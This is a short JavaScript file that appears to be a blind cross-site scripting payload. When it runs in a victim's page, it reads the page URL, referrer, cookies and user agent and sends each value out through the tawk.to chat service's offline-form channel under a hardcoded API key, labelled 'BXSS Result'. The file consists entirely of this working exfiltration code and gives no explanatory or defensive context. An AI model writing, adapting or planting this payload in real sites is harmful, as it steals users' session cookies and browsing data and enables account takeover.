var api_key = '5e7ca73335bcbb0c9aaa9db9';
var timestamp = (new Date()).getTime();
var sk = null;
var ui = null;
var vss = null
var uuid = null;
var sid = null;
var bxss_data = {
  dl: window.location.href,
  dr: document.referrer,
  dc: document.cookie,
  ua: navigator.userAgent
}
fetch(`https://va.tawk.to/register/${timestamp}`, {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: `a=${api_key}`
}).then((response) => {
  return response.json();
})
.then((data) => {
  sk = data["sk"];
  vss = data["vss"];
  uuid = encodeURIComponent(data["uuid"])

  fetch(`https://${vss}/s/?k=${sk}&u=${uuid}&uv=2&a=${api_key}&cver=0&pop=true&w=WTEHPO&jv=681&asver=10&ust=false&p=vulnbase&r=&EIO=3&transport=polling&__t=N0RIk0W`, {
    credentials: 'include'
  }).then((response) => {
    return response.text();
  })
  .then((data) => {
    sid = JSON.parse(data.slice(5))["sid"];
    console.log(sid);
    var ws = new WebSocket(`wss://${vss}/s/?k=${sk}&u=${uuid}&uv=2&a=${api_key}&cver=0&pop=true&w=WTEHPO&jv=681&asver=10&ust=false&p=vulnbase&r=&EIO=3&transport=websocket&sid=${sid}&__t=N0RIk0W`);
    ws.onopen = function () {
      ws.send('2probe');
    };
    ws.onmessage = function (evt) {
      var received_msg = evt.data;
      console.log(received_msg);
      if (received_msg == '3probe') {
        ws.send('5');
        for (var key in bxss_data) {
          var value = bxss_data[key];
          ws.send('4' + JSON.stringify({"c":"service","cb":0,"p":["visitor-chat","/v1/visitor/offline-form",{"questions":[{"label":"Submitted From","answer":`https://tawk.to/chat/${api_key}/default`},{"label":"Name","answer":"BXSS Result"},{"label":"Email","answer":"test@test.com"},{"label":"Message","answer": `${key}: ${JSON.stringify(value)}`}],"name":"test","email":"test@test.com"}]}));
        }
      }
    };
  });
});
